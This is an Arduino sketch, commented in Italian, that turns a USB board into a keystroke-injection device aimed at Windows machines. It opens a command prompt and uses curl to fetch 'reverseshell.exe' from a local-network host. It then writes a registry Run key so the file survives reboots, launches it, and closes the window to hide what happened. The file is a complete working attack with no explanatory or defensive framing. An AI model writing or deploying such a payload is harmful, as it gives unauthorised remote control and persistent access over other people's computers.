#include <Keyboard.h>

void setup() {
  delay(5000);  // Attendere che il computer riconosca la tastiera USB

  // Funzione per aprire cmd
  openCmd();
  delay(100);
  Keyboard.print("cd ../Public/Documents");

  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("curl -O ");

  doppioApice();

  Keyboard.print("192.168.1.249/reverseshell.exe");

  doppioApice();

  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.print("reg add ");
  doppioApice();
  //mette il doppio apice
  Keyboard.print("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
  doppioApice();
  //mette il doppio apice
  Keyboard.print(" /v reverseshell /d ");
  doppioApice();
  //mette il doppio apice
  Keyboard.print("C:\\Users\\Public\\Documents\\reverseshell.exe");
  doppioApice();
  //mette il doppio apice
  Keyboard.print(" /f");

  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.println("reverseshell.exe");

  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(4000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(500);
  Keyboard.releaseAll();
  delay(500);

  
}

void loop() {
  // Non fare nulla nel loop principale
  
  
  // Aggiungi ulteriore ritardo se necessario per vedere il risultato
}

// Funzione per aprire il cmd
void openCmd() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("cmd");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
}

void doppioApice(){

  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_2);
  delay(100);
  Keyboard.releaseAll();
  //mette il doppio apice
}
